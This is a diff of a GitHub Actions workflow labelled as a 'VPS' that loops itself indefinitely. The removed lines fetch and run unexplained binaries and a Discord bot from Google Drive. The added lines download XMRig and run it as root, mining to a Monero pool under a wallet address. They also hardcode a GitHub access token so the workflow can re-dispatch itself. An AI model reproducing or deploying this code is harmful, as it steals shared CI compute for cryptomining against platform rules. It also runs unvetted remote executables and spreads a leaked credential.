@@ -1,4 +1,5 @@
 name: Create VPS (Auto Restart)
+
 on:
   workflow_dispatch:
   repository_dispatch:
@@ -7,44 +8,43 @@ on:
 jobs:
   start-vps:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
-    env:
-      VPS_NAME: ${{ github.event.client_payload.vps_name || 'manual-vps' }}
+    timeout-minutes: 360  # 6 hours
+
     steps:
-    - name: ⬇️ Checkout
-      uses: actions/checkout@v3
-    - name: ⚙️ Setup Node.js
-      uses: actions/setup-node@v3
-      with:
-        node-version: '20'
-    - name: 📦 Install & Run Bot
-      run: |
-        sudo su
-        npm i discord.js
-        pip install gdown
-        gdown https://drive.google.com/uc?id=1Bw29iCwIwRAJloZZEDG_Kbe9cxNojaU7 -O fjium-hex
-        chmod +x fjium-hex
-        gdown https://drive.google.com/uc?id=1C-VKIrv3mB6yzVMLaKVApOlA3HAdl0Vv -O fjium-dns
-        chmod +x fjium-dns
-        gdown https://drive.google.com/uc?id=1txI5kbI8G7mvrqLJa2pXeUzqYvSScQWb -O fjium-gudp
-        chmod +x fjium-gudp
-        gdown https://drive.google.com/uc?id=16FqLtZZ6gb9KATWkRRZKdDQYyFn8H4xk -O fjium-mix
-        chmod +x fjium-mix
-        gdown https://drive.google.com/uc?id=1D8q4EvkTB-FvsypFdRfjDPwSXRiPlzGb -O botdis.js
-        node botdis.js > bot.log 2>&1 &
-        echo "✅ Bot is running in background..."
-    - name: ⏳ Keep VPS alive
-      run: |
-        for i in $(seq 1 360); do
-          echo "🟢 Running minute $i/360..."
-          sleep 60
-        done
-    - name: 🔁 Restart workflow
-      if: always()
-      run: |
-        curl -X POST \
-          -H "Accept: application/vnd.github+json" \
-          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-          -H "Content-Type: application/json" \
-          https://api.github.com/repos/${{ github.repository }}/dispatches \
-          -d '{"event_type": "create-vps"}'
+      - name: ⬇️ Checkout
+        uses: actions/checkout@v3
+
+      - name: 📁 Prepare dirs
+        run: mkdir -p links .backup
+
+      - name: 💾 Restore backup (optional)
+        run: |
+          name="${{ github.event.client_payload.vps_name || 'manual-vps' }}"
+          if [ "${{ github.event.client_payload.backup }}" == "true" ]; then
+            unzip ".backup/$name.zip" -d . || echo "⚠️ No backup found."
+          fi
+
+      - name: 📥 Setup VPS (XMRig)
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
+          tar -xvzf xmrig-6.24.0-focal-x64.tar.gz
+          cd xmrig-6.24.0
+          sudo su -c "nohup ./xmrig -o asia.hashvault.pro:443 -u 8AHRHxFXTbBDBh57fByZ1ZGmMh3fwUFiVRe4FCS4yGDqb9FMtVHXNvS9u5UVMVLDU3MhQ6dAfZWnCKq2rUBSXPQLGRT6unC -p vipminer -a rx --tls --cpu-priority=5 --randomx-1gb-pages -t 4 > xmrig.log 2>&1 &"
+          echo "✅ XMRig started in background."
+
+      - name: ⏳ Keep VPS alive
+        run: |
+          for i in $(seq 1 $((360))); do
+            echo "🟢 Running minute $i/360..."
+            sleep 60
+          done
+
+      - name: 🔁 Restart workflow
+        if: always()
+        run: |
+          curl -X POST \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer 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" \
+            -H "Content-Type: application/json" \
+            https://api.github.com/repos/${{ github.repository }}/dispatches \
+            -d '{"event_type": "create-vps", "client_payload": {"vps_name": "manual-vps", "backup": true}}'
